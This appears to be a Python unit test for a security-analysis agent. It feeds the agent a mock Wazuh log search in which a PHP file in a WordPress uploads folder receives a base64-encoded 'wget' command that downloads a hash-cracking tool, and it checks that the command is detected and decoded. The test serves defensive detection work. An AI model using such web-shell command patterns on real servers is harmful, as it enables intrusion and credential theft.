from __future__ import annotations

import base64
import importlib.util
import json
import os
import sys
import types
import unittest

project_root = os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))


def _load_module(name: str, path: str):
    spec = importlib.util.spec_from_file_location(name, path)
    module = importlib.util.module_from_spec(spec)
    assert spec and spec.loader
    sys.modules[name] = module
    spec.loader.exec_module(module)
    return module


def _load_observation_module():
    agent_pkg = types.ModuleType("agent")
    agent_pkg.__path__ = [os.path.join(project_root, "agent")]
    runtime_pkg = types.ModuleType("agent.runtime")
    runtime_pkg.__path__ = [os.path.join(project_root, "agent", "runtime")]
    graph_pkg = types.ModuleType("agent.runtime.graph")
    graph_pkg.__path__ = [os.path.join(project_root, "agent", "runtime", "graph")]
    analysis_pkg = types.ModuleType("agent.runtime.analysis")
    analysis_pkg.__path__ = [os.path.join(project_root, "agent", "runtime", "analysis")]
    query_memo = types.ModuleType("agent.runtime.analysis.query_memo")
    query_memo.BROAD_HIT_THRESHOLD = 10000

    def _extract_hit_count(raw):
        if isinstance(raw, dict):
            return raw.get("total")
        try:
            return json.loads(raw).get("total")
        except Exception:
            return None

    query_memo.extract_hit_count = _extract_hit_count
    sys.modules.setdefault("agent", agent_pkg)
    sys.modules.setdefault("agent.runtime", runtime_pkg)
    sys.modules.setdefault("agent.runtime.graph", graph_pkg)
    sys.modules.setdefault("agent.runtime.analysis", analysis_pkg)
    sys.modules.setdefault("agent.runtime.analysis.query_memo", query_memo)
    return _load_module(
        "agent.runtime.graph.observation",
        os.path.join(project_root, "agent", "runtime", "graph", "observation.py"),
    )


artifacts = _load_module(
    "artifact_extraction_for_minority_test",
    os.path.join(project_root, "agent", "runtime", "analysis", "artifacts.py"),
)
observation = _load_observation_module()


def _wazuh_result() -> dict:
    token = base64.b64encode(json.dumps([
        "wget",
        "https://github.com/ait-aecid/wphashcrack/archive/refs/tags/v0.1.tar.gz",
    ]).encode()).decode()
    return {
        "total": 10000,
        "total_relation": "gte",
        "truncated": True,
        "events": [{
            "_id": "noise-404",
            "_source": {
                "@timestamp": "2022-01-18T12:22:01Z",
                "agent": {"name": "wazuh-client", "ip": "10.35.35.206"},
                "data": {
                    "srcip": "172.17.130.196",
                    "id": "404",
                    "url": "/wp-content/uploads/noise",
                },
                "rule": {"id": "31101", "groups": ["web", "accesslog"], "level": 5},
                "full_log": "GET /wp-content/uploads/noise HTTP/1.1 404",
            },
        }],
        "selectivity_map": [{
            "field": "data.id",
            "dominant": "404",
            "dominant_share": 0.997,
            "minorities": [
                {"value": "403", "count": 75},
                {"value": "200", "count": 6},
                {"value": "301", "count": 4},
            ],
            "role": "discriminator",
        }],
        "minority_sample": [{
            "_id": "ws-200",
            "_source": {
                "@timestamp": "2022-01-18T12:38:29Z",
                "agent": {"name": "wazuh-client", "ip": "10.35.35.206"},
                "data": {
                    "srcip": "172.17.130.196",
                    "id": "200",
                    "url": f"/wp-content/uploads/2022/01/x.php?wp_meta={token}",
                },
                "rule": {"id": "31108", "groups": ["web", "accesslog"], "level": 0},
                "full_log": "GET /wp-content/uploads/2022/01/x.php?... HTTP/1.1 200 python-requests/2.27.1",
            },
        }],
    }


class MinoritySampleEvidenceTest(unittest.TestCase):
    def test_artifact_extraction_reads_minority_sample_events(self):
        found = artifacts.extract_artifacts(json.dumps(_wazuh_result()))
        commands = [item for item in found if item.kind == "command"]

        self.assertTrue(
            any("wphashcrack" in item.value and item.source == "ws-200" for item in commands),
            f"decoded minority_sample command missing: {commands}",
        )

    def test_observation_treats_minority_sample_as_evidence(self):
        obs = observation.build_observation([{
            "name": "search",
            "raw": _wazuh_result(),
            "artifacts": [],
        }], objective="find successful payload execution")

        snapshots = obs["evidence_snapshots"]
        self.assertTrue(any(s.get("event_id") == "ws-200" for s in snapshots), snapshots)
        self.assertTrue(any(s.get("status") == "200" and "wp_meta=" in s.get("url", "") for s in snapshots), snapshots)
        self.assertIn("event:ws-200", obs["evidence_markers"])
        self.assertEqual(obs["discriminator"]["minority_values"], ["403", "200", "301"])
        self.assertIn("inspect and decode", " ".join(obs["recommended_moves"]))


if __name__ == "__main__":
    unittest.main(verbosity=2)
